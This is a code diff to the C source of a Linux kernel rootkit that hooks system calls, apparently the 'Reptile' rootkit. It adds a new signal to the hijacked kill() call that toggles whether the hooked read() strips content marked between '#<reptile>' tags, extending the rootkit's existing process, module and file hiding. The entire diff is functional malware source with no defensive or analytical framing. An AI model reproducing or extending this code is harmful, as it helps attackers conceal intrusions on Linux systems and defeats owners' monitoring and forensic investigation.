@@ -34,12 +34,13 @@
 #define SIGKNOCK 	48
 #define SIGHIDEPROC 	49
 #define SIGHIDEREPTILE 	50
+#define SIGHIDECONTENT  51
 #define HIDE 		"reptile"
 #define SSIZE_MAX 	32767
 #define HIDETAGIN 	"#<reptile>"
 #define HIDETAGOUT 	"#</reptile>"
 
-int hidden = 0, knockon = 0;
+int hidden = 0, knockon = 0, hide_file_content = 1;
 static struct list_head *mod_list;
 static unsigned long *sct;
 atomic_t read_a;
@@ -220,6 +221,10 @@ asmlinkage int l33t_kill(pid_t pid, int sig){
 				knockon = 1;
 			}
 			break;
+		case SIGHIDECONTENT:
+			if(hide_file_content) hide_file_content = 0;
+			else hide_file_content = 1;
+			break;
 		default:
 			return o_kill(pid, sig);
 	}
@@ -319,19 +324,26 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 	struct file *f;
 	int fput_needed;
-	ssize_t ret = -EBADF;
+	ssize_t ret;
+       
+	if(hide_file_content) {
+		ret = -EBADF;
 
-	atomic_set(&read_a, 1);
-	f = e_fget_light(fd, &fput_needed);
+		atomic_set(&read_a, 1);
+		f = e_fget_light(fd, &fput_needed);
 
-	if (f) {
-		ret = vfs_read(f, buf, nbytes, &f->f_pos);
+		if (f) {
+			ret = vfs_read(f, buf, nbytes, &f->f_pos);
 
-		if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
+			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
 	    	
-		fput_light(f, fput_needed);
+			fput_light(f, fput_needed);
+		}
+		atomic_set(&read_a, 0);
+	} else {
+		ret = o_read(fd, buf, nbytes);
 	}
-	atomic_set(&read_a, 0);
+
 	return ret;
 }
 
